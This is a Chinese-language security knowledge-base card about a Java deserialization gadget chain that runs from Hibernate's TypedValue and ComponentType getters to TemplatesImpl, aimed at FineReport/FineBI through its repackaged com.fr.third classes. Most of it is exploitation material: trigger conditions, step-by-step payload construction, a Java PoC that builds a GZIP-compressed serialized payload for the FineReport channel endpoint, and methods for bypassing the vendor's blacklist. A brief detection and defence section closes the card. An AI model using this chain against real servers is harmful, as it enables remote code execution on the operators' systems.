---
id: web-java-deser-hibernate-componenttype-getter-templatesimpl
title: Hibernate getter 链直达 TemplatesImpl：HashMap 触发 TypedValue/ComponentType/PojoComponentTuplizer→GetterMethodImpl 反射 getOutputProperties（含 com.fr.third 重打包适配）
type: scenario
domain: web
path: web/java/deserialization
technique: hibernate-componenttype-getter-templatesimpl
tags:
- java
- deserialization
- hibernate
- templatesimpl
- getter
- hashmap
- rce
- finereport
- finebi
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V589
  verified_at: '2026-11-12T14:19:29+08:00'
  notes: 已对照原文与10张截图核对：img01 GZIPInputStream包装、img02 CustomObjectInputStream(resolveClass→ClassFactory)、img04 Invocation.deserialize 中readObject调用、img05 com.fr.third Hibernate getPayload(TypedValue/ComponentType/PojoComponentTuplizer/GetterMethodImpl+BasicGetter回退)与卡内PoC逐行一致；img06 blacklist.txt证实后续封禁hibernate。链路TypedValue.hashCode→ComponentType.getHashCode→tuplizer getters→getOutputProperties与Hibernate源码机制相符；触发容器HashMap、propertySpan/propertyTypes设置与原文一致。dedup：与web-java-deser-hibernate-activatableref-jrmp-secondary-bypass同为Hibernate getter机制但sink(TemplatesImpl直打)与容器(HashMap)不同，与vaadin/rome/CC等getter→TemplatesImpl卡触发类不同，非同链；全局dup-scan无本卡pair。原文未标注FineBI/Hibernate版本，affected_versions保持空。
url: /docs/web/java/deserialization/web-java-deser-hibernate-componenttype-getter-templatesimpl/
draft: false
kb_aliases:
- Hibernate getter 链
- TypedValue ComponentType 链
- Hibernate1 Hibernate2
- GetterMethodImpl getOutputProperties
- 帆软 com.fr.third hibernate
---

## 一句话结论

当 classpath 存在 Hibernate 5.x（或帆软把依赖重打包后的 `com.fr.third.org.hibernate.*`）时，可构造 `HashMap{TypedValue(ComponentType, TemplatesImpl)}`：反序列化重建 HashMap 时重算 key 的 `hashCode`，经 `TypedValue.hashCode → ComponentType.getHashCode → AbstractComponentTuplizer.getPropertyValue → GetterMethodImpl.get` 反射调用无参 getter；把 getter 的 `Method` 指向 `TemplatesImpl.getOutputProperties()`，即可在哈希阶段触发 `newTransformer()` 加载 `_bytecodes` 中的恶意 translet 执行命令。

## 原理

- **Hibernate 的类型值链**：`TypedValue.hashCode()` 对其 `type` 调用 `type.getHashCode(value)`；`ComponentType.getHashCode` 会通过 `componentTuplizer` 取组件属性值并参与哈希；`AbstractComponentTuplizer` 持有一个 `getters` 数组，元素是 `GetterMethodImpl`/`BasicGetter` 这类封装了 `java.lang.reflect.Method` 的 getter。
- **Getter 变成任意方法调用**：`GetterMethodImpl.get(owner)` 执行 `getterMethod.invoke(owner)`；攻击者用反射把 `getterMethod` 设为 `TemplatesImpl.class.getDeclaredMethod("getOutputProperties")`，当链走到 getter 时便以 `TemplatesImpl` 实例为 owner 调用该无参方法。
- **TemplatesImpl 的 getter 即执行点**：`getOutputProperties()` 等价于 `newTransformer()`，会 `defineTransletClasses()` 把 `_bytecodes` 中的字节码定义为类并实例化；恶意 translet 的构造器/静态块执行命令，这就是常见的 TemplatesImpl sink。
- **HashMap 提供 hashCode 触发**：反序列化 `HashMap` 时，`readObject` 对每个键值对调用 `putVal(hash(key), key, value, ...)`，重新计算 key 的哈希；只要 key 是 `TypedValue`，`hashCode` 就会触发上述 getter 链。
- **对象图关键字段**：`ComponentType.componentTuplizer` 指向 `PojoComponentTuplizer` 实例；`AbstractComponentTuplizer.getters` 数组长度为 1 且元素为设好 Method 的 getter；`ComponentType.propertySpan=1`、`propertyTypes={自身}`；`TypedValue.value=TemplatesImpl`、`TypedValue.type=ComponentType`。
- **重打包适配**：帆软把第三方库 shade 到 `com.fr.third.*`（如 `com.fr.third.org.hibernate.type.ComponentType`、`com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl`），并与正常 maven 包名不同；构造 payload 时必须使用目标 classpath 中实际存在的类名，否则类加载失败。
- **版本差异**：Hibernate 5.x 提供 `GetterMethodImpl`；较老版本回退到 `BasicPropertyAccessor$BasicGetter(Class, Method, String)`。`GetterMethodImpl` 的构造器参数随版本变化，文章按 `getDeclaredConstructors()[0]` 反射选取，需按目标版本核对。

## 触发条件

- classpath 含 Hibernate 5.x（或帆软 `com.fr.third` 重打包版），存在 `ComponentType`、`PojoComponentTuplizer`、`GetterMethodImpl`/`BasicGetter`。
- 目标有 Java 原生反序列化入口，且外层黑名单未拦截 Hibernate 类与 TemplatesImpl（若被拦截，可用 SignedObject/二次反序列化内层裸流绕过）。
- 可使用 JDK 内置或外部 Xalan 的 `TemplatesImpl`，并能构造 `_bytecodes`、`_name` 等私有字段（Unsafe/反射）。
- 入口若要求 GZIP（如帆软 `/webroot/decision/remote/design/channel`），序列化数据需先 GZIP 压缩再发送。

## 利用步骤

1. 用 Javassist/ASM 生成继承 `AbstractTranslet` 的恶意类，在构造器或静态块中执行命令，得到字节码。
2. 反射/Unsafe 构造 `TemplatesImpl`，设置 `_bytecodes={evilBytes}`、`_name` 等字段（必要时设 `_tfactory`）。
3. 反射构造 `PojoComponentTuplizer`，把 `AbstractComponentTuplizer.getters` 设为长度为 1 的数组，元素为 `GetterMethodImpl`/`BasicGetter`，其 `getterMethod` 指向 `TemplatesImpl.getOutputProperties`。
4. 反射构造 `ComponentType`，设置 `componentTuplizer`、`propertySpan=1`、`propertyTypes={自身}`。
5. `new TypedValue(componentType, null)` 作为 HashMap 的 key，先放入 HashMap（此时 value 为 null），再把 `TypedValue.value` 反射设为 `TemplatesImpl`；反序列化端重建 HashMap 时会用新 value 重算哈希。
6. `serialize(HashMap)`；若目标入口是帆软 channel 一类，再 GZIP 压缩后 POST。
7. 服务端 `HashMap.readObject → putVal → TypedValue.hashCode` 触发 getter → `TemplatesImpl.getOutputProperties` → 命令执行。

## PoC

```java
Class<?> componentTypeClass = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
Class<?> pojoTuplizerClass  = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
Class<?> abstractTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");

TemplatesImpl tmpl = utils.getTeml(evilBytes);
Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

Object getter;
try {
    Class<?> c = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
    Constructor<?> ctor = c.getDeclaredConstructors()[0];
    ctor.setAccessible(true);
    getter = ctor.newInstance(null, null, method);
} catch (Exception ignored) {
    Class<?> c = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
    Constructor<?> ctor = c.getDeclaredConstructor(Class.class, Method.class, String.class);
    ctor.setAccessible(true);
    getter = ctor.newInstance(tmpl.getClass(), method, "outputProperties");
}

Object getters = Array.newInstance(getter.getClass(), 1);
Array.set(getters, 0, getter);

AbstractComponentTuplizer tuplizer =
    (AbstractComponentTuplizer) utils.createInstanceUnsafely(pojoTuplizerClass);
Field f = abstractTuplizerClass.getDeclaredField("getters");
f.setAccessible(true);
f.set(tuplizer, getters);

Object type = utils.createInstanceUnsafely(componentTypeClass);
utils.setFieldValue(type, "componentTuplizer", tuplizer);
utils.setFieldValue(type, "propertySpan", 1);
utils.setFieldValue(type, "propertyTypes", new Type[]{(Type) type});

TypedValue typedValue = new TypedValue((Type) type, null);
HashMap<Object, Object> map = new HashMap<>();
map.put(typedValue, "123");
utils.setFieldValue(typedValue, "value", tmpl);

byte[] payload = utils.GzipCompress(utils.serialize(map));
```

## 变体与关联

- **同一 getter 链换 sink**：`web-java-deser-hibernate-activatableref-jrmp-secondary-bypass` 用同样的 TypedValue/ComponentType getter 机制把 sink 换成 `ActivatableRef.getRef`，经 JRMP 做二次反序列化；本卡是直接 `TemplatesImpl.getOutputProperties`，触发容器用 HashMap。
- **其他 getter→TemplatesImpl 入口**：`web-java-deser-rome-equalsbean-tostringbean-templatesimpl`（Rome ToStringBean）、`web-java-deser-commonsbeanutils-cb1-beancomparator-priorityqueue`（CB1 BeanComparator）都与本卡同 sink，区别在触发类与调用链。
- **帆软入口**：本链常见于帆软 `/webroot/decision/remote/design/channel` 的 GZIP 反序列化（见 `web-java-deserialization-finereport-channel-gzip-safeinvocation`）；该版本官方后续加入黑名单封禁 Hibernate，需要改走 Jackson 组合链（见 `web-java-deser-hsts-xstring-pojonode-signedobject-inner-bave-templatesimpl`）。
- **黑名单内层绕过**：外层 resolvClass 拦截 Hibernate/TemplatesImpl 时，可把本链整体装进 `SignedObject` 的 content，由 `getObject()` 的普通 ObjectInputStream 反序列化，绕过外层类名检查。

## 检测与防御

- 检测：反序列化流量中出现 `com.fr.third.org.hibernate`/`org.hibernate` 的 `ComponentType`、`PojoComponentTuplizer`、`TypedValue`、`GetterMethodImpl` 组合；`TemplatesImpl` 的 `_bytecodes` 字段；入口日志出现 GZIP 包裹的 Java 序列化魔数 `AC ED`。
- 防御：升级到已加入 Hibernate/TemplatesImpl 黑名单的版本只是临时缓解；根本方案是使用 `ObjectInputFilter`/JEP 290 白名单、避免对不可信数据调用原生反序列化。
- 加固：不要仅依赖类名前缀黑名单（SignedObject/JRMP 等二次反序列化可绕过），需对嵌套流也应用过滤策略。
